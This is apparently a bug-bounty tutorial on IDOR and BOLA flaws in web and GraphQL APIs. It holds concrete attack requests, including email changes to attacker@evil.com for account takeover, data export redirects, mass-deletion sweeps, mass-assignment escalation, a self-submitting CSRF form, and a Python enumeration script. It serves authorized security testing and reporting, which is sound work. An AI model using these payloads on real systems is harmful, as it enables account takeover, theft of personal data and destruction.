Chapter 01

IDOR Fundamentals & Threat Model

The simplest concept in web security. The most persistently rewarding bug class. One missing authorization check, unlimited victims.

1.1 What IDOR Actually Is

Insecure Direct Object Reference (IDOR) is a subset of Broken Access Control — the #1 vulnerability in OWASP Top 10. It occurs when an application exposes a direct reference to an internal object (a database record, file, user account, order, or message) and then fails to verify whether the requesting user actually has permission to access that specific object.

The server asks the wrong question. It asks: "Is this user logged in?" — but never asks: "Does this user own this resource?" The gap between those two questions is the entire IDOR vulnerability class.

⚡ The One-Line Definition

You change someone else's ID in a request, the server returns their data. That's IDOR.

GET /api/invoice?id=1024 → your invoice
GET /api/invoice?id=1023 → someone else's invoice (IDOR)

1.2 Why IDOR Is So Common and So Dangerous

Analysis of 250 disclosed IDOR reports on HackerOne spanning 2017–2025 reveals that 36.4% of IDOR reports are rated High or Critical. The average critical-severity IDOR bounty is $14,333. Individual reports have reached $20,000. Total disclosed bounties exceeded $129,000 — and that's only the public subset.

IDOR persists because:

  • Authorization is checked at login but often not re-checked on every resource access
  • Frontend-only enforcement (JavaScript hides the button but the API still responds)
  • Microservices add endpoints that each independently fail to recheck authorization
  • Mobile apps expose API endpoints the web interface never shows
  • Legacy "zombie" API endpoints lose access control during refactors
  • Developers confuse authentication ("who are you?") with authorization ("what can you do?")

Chapter 02

Types of Object References — Know What You're Hunting

IDs come in many forms. Sequential integers are obvious. UUIDs, hashes, and encoded values require more technique — but are just as exploitable.

2.1 Sequential Integer IDs

The classic IDOR. Database auto-increment IDs — 1, 2, 3, 4… Trivially enumerable. Still account for 36.9% of confirmed BOLA cases in modern 2023–2026 disclosures from mature security programs.

# Classic sequential IDOR:
GET /api/users/1234/profile   → Your profile
GET /api/users/1233/profile   → Someone else's ← IDOR

GET /invoice?id=10240
GET /invoice?id=10239        ← Previous invoice (IDOR)

# Burp Intruder enumeration:
# Payload: Numbers, From: TARGET-100, To: TARGET+100, Step: 1
# Filter: Status 200, or Response Length different from empty response

2.2 UUIDs — Not as Safe as Developers Think

UUID v1 encodes a timestamp and MAC address — mathematically predictable. UUID v4 is random and cannot be guessed — but can still leak from other endpoints, and leaked UUIDs enable targeted IDOR.

# UUID v1 = time-based (predictable):
xxxxxxxx-xxxx-1xxx-yxxx-xxxxxxxxxxxx

# UUID v4 = random (not guessable, but leaks through):
xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx

# Where UUIDs leak — always check these:
# - Shared resource URLs ("view this document")
# - API responses listing other users you interact with
# - Email notifications ("User uuid-xxxx viewed your file")
# - Error messages ("Access denied for resource uuid-xxxx")
# - GraphQL global IDs in responses
# - CSV/export files containing all user IDs
# - Search API results

# GraphQL global IDs — base64 encoded Type:ID:
VXNlcjoxMjM0  →  base64 decode  →  User:1234
# Modify: User:1233 → base64 encode → VXNlcjoxMjMz  ← use in next query

2.3 Encoded / Hashed References

# Base64 — trivially reversible:
dXNlcl8xMjM0  →  decode  →  user_1234
# Increment: user_1233 → encode → dXNlcl8xMjMz  ← new IDOR payload
echo -n "user_1233" | base64
→ dXNlcl8xMjMz

# MD5 of predictable values (email → ID):
echo -n "victim@email.com" | md5sum
→ 5d41402abc4b2a76b9719d911017c592
# If ID = MD5(email), know the email → know the ID → IDOR

2.4 Non-ID Object References to Test

filename=file=document=path= report_name=template=account_number= email=username=phone=token= slug=reference=invoice_ref= order_number=ticket_id=receipt_id= session_id=batch_id=export_id=

Finding the Attack Surface

IDOR is everywhere — but you need to know exactly where to look.

3.1 Feature-Level Targets

👤
User Profiles
/api/users/1234 — read PII, email, phone, addresses. Write-based IDOR can change victim's profile.
📦
Orders & Invoices
/orders/5001 — access purchase history, shipping addresses, partial card numbers.
💬
Messages & Tickets
/messages/thread/8899 — read private conversations, support ticket history.
📄
Documents & Files
/files/download?id=abc — private contracts, medical records, tax forms.
💳
Payments & Transactions
/transactions/9001 — highest sensitivity: bank accounts, card data, amounts.
🔑
Password Reset / MFA
/api/mfa/disable?user_id=1234 — IDOR here = direct account takeover.
📊
Reports & Exports
Async CSV/PDF export jobs get an export_id — try adjacent IDs for other users' data exports.
🔔
Notifications
/notifications/mark-read?id=5432 — reveals another user received a notification.

3.2 API Endpoint Discovery

# 1. Intercept mobile app traffic (highest IDOR density):
#    Burp + Android emulator or iOS — every API call is a test candidate

# 2. Extract endpoints from JS bundles:
curl -s https://target.com/static/app.js | grep -oP '"(/api/v[0-9]+/[a-z0-9/_-]+)"' | sort -u

# 3. Historical endpoints via gau:
gau target.com | grep "=" | grep -v ".png\|.jpg\|.css" | sort -u > api_endpoints.txt

# 4. Find hidden parameters with Arjun:
arjun -u https://target.com/api/user --get
arjun -u https://target.com/api/user --post

# 5. API documentation leaks:
https://target.com/swagger.json
https://target.com/api-docs
https://target.com/openapi.yaml

3.3 The Two-Account Testing Setup

1
Create two test accounts (A = attacker, B = victim)Both must have real data — orders, messages, files, profiles.
2
Log in as B, collect every object IDWrite down all IDs: user_id, order_id, document_id, thread_id from every request.
3
Log in as A, replay B's requestsUse A's session token but B's object IDs. Every endpoint A reaches with B's IDs is a potential IDOR.
4
Compare — if you get B's data → confirmed IDORDocument the full request/response pair with both accounts clearly identified.
💡 Automate with Autorize (Burp Extension)

Install Autorize from the BApp Store. Paste B's session cookie into the Autorize panel. Browse as A normally. Autorize replays every request with B's cookie and flags matches. Green = same response with B's auth = potential IDOR. This catches IDORs you'd miss manually across hundreds of endpoints.

Chapter 04

Read-Based IDOR

Accessing data you should never see. The most common IDOR type.

4.1 URL Path & Query Parameter IDOR

# URL path IDOR:
GET /api/v1/user/1233/profile HTTP/1.1
Authorization: Bearer ATTACKER_TOKEN
# → Returns victim's name, email, phone, address

# Query parameter IDOR:
GET /api/documents?user_id=VICTIM_ID&format=json HTTP/1.1
Authorization: Bearer ATTACKER_TOKEN

# File-based IDOR:
GET /uploads/user1233-invoice.pdf HTTP/1.1
GET /exports/account-5678-statement.csv HTTP/1.1

4.2 IDOR in Request Bodies

# JSON body IDOR — extremely common in modern APIs:
POST /api/documents/view HTTP/1.1
Content-Type: application/json

{"document_id": "VICTIM_DOC_ID", "user_id": "VICTIM_USER_ID"}

# Form-encoded body:
POST /api/get_receipt HTTP/1.1
Content-Type: application/x-www-form-urlencoded

receipt_id=2983&user_id=456

4.3 IDOR in HTTP Headers

# Try adding these headers — some backends use them for routing:
X-Account-ID: VICTIM_ACCOUNT
X-User-ID: VICTIM_ID
X-Organization-ID: OTHER_ORG
X-Tenant-ID: VICTIM_TENANT

# Also try undocumented headers that bypass access control:
X-Original-User: admin
X-Forwarded-User: admin
X-Authenticated-User: admin@company.com

4.4 IDOR via Leaked IDs in API Responses

# API leaks other users' IDs in normal responses:
GET /api/posts/MY_POST/likes
→ [{"user_id": 1001, "name": "Alice"}, {"user_id": 1002}]

# Now use leaked IDs in IDOR attacks:
GET /api/users/1001/private-messages   ← IDOR using leaked ID

# Search API leaks IDs:
GET /api/search?q=john
→ [{"user_id": 5000, "name": "John Doe"}]
GET /api/users/5000/invoices   ← IDOR using search-leaked ID
Chapter 05

Write & Delete IDOR — The Critical-Severity Upgrades

Write and delete operations are always rated higher. This is where you move from "information disclosure" to "account takeover."

5.1 Write-Based IDOR → Account Takeover

# Change victim's email (leads to ATO via password reset):
PUT /api/users/VICTIM_ID/profile HTTP/1.1
Authorization: Bearer ATTACKER_TOKEN
{"email": "attacker@evil.com"}
# → Now trigger password reset to attacker@evil.com → full ATO

# Change victim's password directly:
POST /api/account/change-password
{"user_id": "VICTIM_ID", "new_password": "hacked123"}

# Disable victim's MFA:
PUT /api/users/VICTIM_ID/mfa
{"mfa_enabled": false}

# Fraudulent subscription for free:
POST /api/subscription/upgrade
{"account_id": "VICTIM_ACCOUNT", "plan": "enterprise", "price": "0.00"}

5.2 Delete-Based IDOR

# Delete another user's files:
DELETE /api/files/VICTIM_FILE_ID HTTP/1.1
Authorization: Bearer ATTACKER_TOKEN

# Mass deletion via Burp Intruder sweep:
DELETE /api/documents/§1§ HTTP/1.1
# Payload: 1001 to 2000 → 1000 users' documents deleted

5.3 HTTP Method Switching — Critical Bypass Technique

# Authorization enforced inconsistently per HTTP method:
GET /uploads/user1233-photo.jpg   →  403 Forbidden
DELETE /uploads/user1233-photo.jpg →  200 OK ← deletes their photo!
PUT /uploads/user1233-photo.jpg    →  200 OK ← overwrites their photo!
HEAD /uploads/user1233-photo.jpg   →  200 OK ← confirms existence

# API version method inconsistency:
POST /api/v2/documents/VICTIM_ID  →  403 (new, protected)
GET  /api/v1/documents/VICTIM_ID  →  200 (old, unprotected) ← IDOR

5.4 Privilege Escalation via Write IDOR

# Invite yourself as admin to another organization:
POST /api/organization/OTHER_ORG_UUID/invite
{"user_id": "ATTACKER_ID", "role": "admin"}
# Using another org's UUID you're not a member of → join as admin

# Mass assignment — add privileged fields to profile update:
PUT /api/users/MY_ID/profile
{"name": "test", "is_admin": true, "role": "admin", "balance": 99999}
Chapter 06

Blind IDOR & Indirect Leakage

No data returned — but you still win. Detect via status codes, timing, email side effects, and out-of-band signals.

6.1 Status Code Oracle

# Even without response data, status codes reveal resource existence:
GET /api/user/1000  →  404  (no user — doesn't exist)
GET /api/user/1001  →  403  (user exists — access denied = information disclosure)
GET /api/user/1002  →  200  (full IDOR — user exists AND data returned)

# Burp Intruder: sweep range, filter by status → 403s = valid IDs

6.2 Email-Based Blind IDOR

# Trigger action that sends data to victim's email:
POST /api/receipts/resend
{"receipt_id": 2983}
# → Receipt emailed to victim — you confirmed receipt 2983 exists

# Redirect export to attacker's email:
POST /api/account/export
{"user_id": "VICTIM_ID", "delivery_email": "attacker@evil.com"}
# → If email field not validated → victim's data sent to attacker

6.3 Timing-Based Blind IDOR

# Database query time differs for found vs not-found:
GET /api/documents/99999  →  Response: 50ms   (not found — exits fast)
GET /api/documents/10001  →  Response: 300ms  (found — DB query + filter)

# Sort Intruder results by "Response Received" column
# Slower responses = valid IDs even when all return the same status code
Chapter 07

BOLA in REST & GraphQL APIs

BOLA (Broken Object Level Authorization) is IDOR's API-native name. GraphQL introduces unique patterns worth mastering.

7.1 REST API BOLA Patterns

# Nested resource references:
GET /api/v1/users/VICTIM_ID/orders
GET /api/v1/organizations/OTHER_ORG_ID/members
GET /api/v1/projects/OTHER_PROJECT_ID/documents

# Add ID parameter to unparameterized endpoints:
GET /api/v1/getuser              →  returns YOUR profile
GET /api/v1/getuser?id=VICTIM   →  returns VICTIM's profile ← IDOR

# API versioning BOLA (old version lacks auth check):
GET /api/v2/user/me/details               →  403 (protected)
GET /api/v1/user/details?id=VICTIM_ID    →  200 ← IDOR (old endpoint)

7.2 GraphQL BOLA

# Step 1: Test if introspection is enabled:
{"query": "{__typename}"}

# Step 2: Dump full schema to find ID-accepting queries:
{"query": "{__schema{types{name fields{name args{name}}}}}"}

# Step 3: IDOR via direct query with victim's ID:
{"query": "{user(id: \"VICTIM_ID\") {email phone address}}"}

# Step 4: Decode GraphQL global IDs (base64: Type:ID):
echo "VXNlcjoxMjM0" | base64 -d  →  User:1234
echo -n "User:1233" | base64     →  VXNlcjoxMjMz  ← use in query

# Step 5: Batch query to enumerate 100 users in ONE request:
{"query": "{
  u1: user(id: \"1001\") { email }
  u2: user(id: \"1002\") { email }
  u3: user(id: \"1003\") { email }
}"}

# Step 6: Write IDOR via mutation:
{"mutation": "mutation {updateUser(id: \"VICTIM_ID\", input: {email: \"att@evil.com\"}) {user{email}}}"}

# Tools: InQL (Burp extension), graphql-cop, graphql-voyager
🎯 Real GraphQL IDOR — $12,500 Payout

On a fintech target: GraphQL introspection was enabled. Schema enumeration revealed getTransaction(id: ID!). Batch aliases in a single mutation accessed and modified other users' financial transactions. CVSS 9.1 → $12,500.

Chapter 08

Bypassing ID Protections

Modern apps add layers of obfuscation and partial validation. Here's how to punch through each one.

8.1 Content-Type Switching

# Protected in JSON — try XML, form-encoded, or multipart:
# Original (blocked):
Content-Type: application/json
{"user_id": "VICTIM"}  →  403

# Try XML:
Content-Type: application/xml
<root><user_id>VICTIM</user_id></root>  →  200?

# Try form-encoded:
Content-Type: application/x-www-form-urlencoded
user_id=VICTIM  →  200?

8.2 Extension / Format Switching

# Access control may only be enforced on certain response formats:
GET /api/receipt/2983       →  403 (JSON)
GET /api/receipt/2983.json  →  200 ← different code path!
GET /api/receipt/2983.xml   →  200
GET /api/receipt/2983.csv   →  200
GET /api/receipt/2983.pdf   →  200

8.3 HTTP Parameter Pollution

# Send ID parameter twice — validator checks first, backend uses last:
GET /api/user?user_id=YOUR_ID&user_id=VICTIM_ID
# Validator: user_id=YOUR_ID ✓ | Backend uses: user_id=VICTIM_ID ← IDOR

# JSON array pollution:
{"user_id": ["YOUR_ID", "VICTIM_ID"]}   ← backend processes both

8.4 Mass Assignment

# Server binds all request params to the user model without filtering:
POST /api/user/update
{"name": "John", "is_admin": true}     ← privilege escalation
{"name": "John", "balance": 99999}      ← financial fraud
{"name": "John", "subscription": "enterprise"}   ← free upgrade

# Find mass assignment field names from: API docs, source code, error messages

Chaining IDOR for Critical Impact

Individual IDOR is High. Chained with other techniques it becomes Critical — the highest bounties come from chains.

9.1 IDOR → Full Account Takeover Chains

1
Read IDOR → Get victim's email → Password Reset → ATORead email via IDOR → trigger password reset to that email → victim's inbox → full ATO
2
Write IDOR → Change victim's email → Password Reset → ATOChange victim's email to attacker@evil.com → trigger reset → email arrives → ATO. Most critical chain.
3
Write IDOR → Disable victim's MFA → LoginPATCH /api/users/VICTIM/mfa {"enabled": false} → log in with stolen/guessed password
4
Write IDOR → Change password directly → ATOPOST /api/users/VICTIM/password {"new_password": "hacked"} → immediate ATO, no email required

9.2 IDOR + CSRF = Unauthenticated IDOR

# If IDOR endpoint also lacks CSRF protection:
<img src="https://target.com/api/user/VICTIM_ID/delete">
# → Victim's account deleted when they visit attacker's page (no click needed)

<form method="POST" action="https://target.com/api/users/VICTIM_ID/email">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
# → Victim's email changed silently, enables ATO

GitLab — Write/Delete IDOR on Repository Objects
CRITICAL
$20,000

HackerOne | Highest IDOR payout in dataset analysis

A regular authenticated GitLab user could modify or delete repository objects belonging to other organizations via sequential integer IDs in a GitLab API endpoint. No membership in the target repository was required. The write/delete nature drove the maximum payout.

  1. Identify GitLab API endpoint accepting sequential resource ID
  2. Create two accounts in different organizations, note both IDs
  3. Use Account A to PUT/DELETE on Account B's resource ID
  4. Server performs operation without ownership check
  5. Demonstrate sweep: affect any repository across the platform
💡 Lesson

Write/delete IDOR always pays more than read IDOR. When you find a read IDOR, immediately probe PUT, PATCH, DELETE on the same path.

☐ File paths / names:         /uploads/userID-invoice.pdf
☐ GraphQL variables:          (id: "ID") in queries and mutations
☐ WebSocket messages:         {"type":"get_data","user_id":"ID"}

── METHOD COVERAGE ────────────────────────────────────────────────
☐ GET     /resource/ID    (read)
☐ POST    /resource/ID    (create/action)
☐ PUT     /resource/ID    (replace)
☐ PATCH   /resource/ID    (partial update)
☐ DELETE  /resource/ID    (delete)
☐ HEAD    /resource/ID    (existence oracle)

── ID TYPE COVERAGE ──────────────────────────────────────────────
☐ Try adjacent IDs: TARGET±1, TARGET±100

☐ Try IDs from different organizations/tenants
☐ Try admin/low-number IDs: 1, 2, 3, 10

11.2 Python IDOR Enumeration Script

import requests, json

YOUR_SESSION = "your_session_cookie"
VICTIM_ID_START = 1230
VICTIM_ID_END = 1240
YOUR_ID = 1234

headers = {"Cookie": f"session={YOUR_SESSION}"}

for uid in range(VICTIM_ID_START, VICTIM_ID_END + 1):
    if uid == YOUR_ID:
        continue
    # Test read IDOR
    r = requests.get(f"https://target.com/api/users/{uid}/profile", headers=headers)
    if r.status_code == 200:
        data = r.json()
        print(f"[READ IDOR] user_id={uid} email={data.get('email','?')}")

    # Test write IDOR
    w = requests.put(f"https://target.com/api/users/{uid}/profile",
        headers=headers,
        json={"test_field": "idor_check"})
    if w.status_code in [200, 204]:
        print(f"[WRITE IDOR] user_id={uid} → {w.status_code}")

12.1 Professional IDOR Hunting Workflow

Phase 1 — Recon & Surface Mapping
# Crawl all endpoints, collect parameterized URLs:
gau target.com | grep -E "=[0-9a-f-]+" | sort -u > param_urls.txt

# Extract API endpoints from JS bundles:
wget -q -O- https://target.com/app.js | grep -oP '"/api/[a-z0-9/_-]+"' | sort -u

# Check for Swagger / OpenAPI documentation:
for path in swagger.json api-docs openapi.yaml v1/docs; do
  curl -so /dev/null -w "%{http_code} $path\n" https://target.com/$path
done
Phase 2 — ID Harvesting
# Log in as Account B, document ALL IDs in a table:
# | Endpoint             | B's ID  | Type         | Sensitivity |
# | /api/orders/{id}    | 50123   | Sequential   | High        |
# | /api/docs/{uuid}    | a3f7b2  | UUID         | High        |

# Collect IDs from: notifications, email content,
# search results, shared links, error messages, export files
Phase 3 — Systematic Testing
# For each ID from B, logged in as A:
# 1. Try GET, POST, PUT, PATCH, DELETE
# 2. Try in URL path, query string, request body
# 3. Try content-type variations
# 4. Try API version variations
# 5. Use Autorize extension for automated coverage
# 6. Manual focus on write/delete endpoints

12.3 The Winning Bug Report Template

## TITLE
[CRITICAL] IDOR in /api/users/{id}/profile → PII Exposure + Account
Takeover via Email Modification

## SEVERITY: Critical
CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (8.1)

## SUMMARY
The /api/users/{id}/profile endpoint accepts a user ID without verifying
the authenticated user owns that resource. Attacker with any valid account
can: (1) read any user's PII, and (2) change any user's email address,
enabling full account takeover via password reset.

## SETUP
Account A (attacker): attacker@test.com, user_id = 1234
Account B (victim):   victim@test.com,   user_id = 1235

## STEPS TO REPRODUCE — Read IDOR
1. Log in as Account A
2. GET /api/users/1235/profile  Authorization: Bearer [A's token]
3. Result: Account B's full profile (name, email, phone, address) returned

## STEPS TO REPRODUCE — Write IDOR → Account Takeover
4. PUT /api/users/1235/profile  {"email": "attacker@evil.com"}
5. Response: 200 OK — B's email changed
6. POST /api/auth/forgot-password  {"email": "attacker@evil.com"}
7. Reset email arrives at attacker@evil.com
8. Reset password → full access to Account B

## PROOF OF CONCEPT
[Screenshot 1: B's profile returned with A's token]
[Screenshot 2: 200 OK on email change PUT request]
[Screenshot 3: Password reset email received by attacker]
[Screenshot 4: Logged in as Account B]

## IMPACT
- Read: Full PII of every user accessible to any authenticated user
- Write: Any user's email/password changeable → full account takeover
- Mass: Sweep user IDs to affect entire user base
- Admin: Low-numbered IDs (1–10) are admin accounts — same vulnerability applies

## REMEDIATION
1. Implement ownership check on every endpoint:
   assert(request.user.id == resource.owner_id)
2. Use indirect references (session-scoped tokens mapped to real IDs)
3. Deploy centralized authorization middleware, not per-endpoint checks
4. Audit ALL endpoints — both read AND write — for consistent enforcement

🎯 Key Takeaways

The one missing question: Every IDOR is caused by the server checking "is this user logged in?" but not "does this user own this object?" Understand this → write better reports and better remediation recommendations.

Two accounts, always: You cannot properly test IDOR with one account. Set up both before touching any target. Log every ID from Account B before switching to A.

Write > Read for bounty: A read IDOR showing PII = High. A write IDOR changing email → password reset → ATO = Critical. Always probe write operations after finding any read IDOR.

UUIDs are not security: Only prevent guessing. Leaked UUIDs (and they always leak) restore the IDOR. Hunt for UUID leakage in API responses, exports, notifications, and error messages.

Zombie APIs are goldmines: v1, v2, mobile-specific, and undocumented endpoints are the richest IDOR targets. They survive refactors without their auth checks. Use gau, JS analysis, and mobile traffic to find them.

GraphQL triples the surface: One endpoint, dozens of BOLA targets. Enable introspection test on every GraphQL target — every query and mutation accepting an ID is a test case. Batch aliases make mass enumeration trivial.
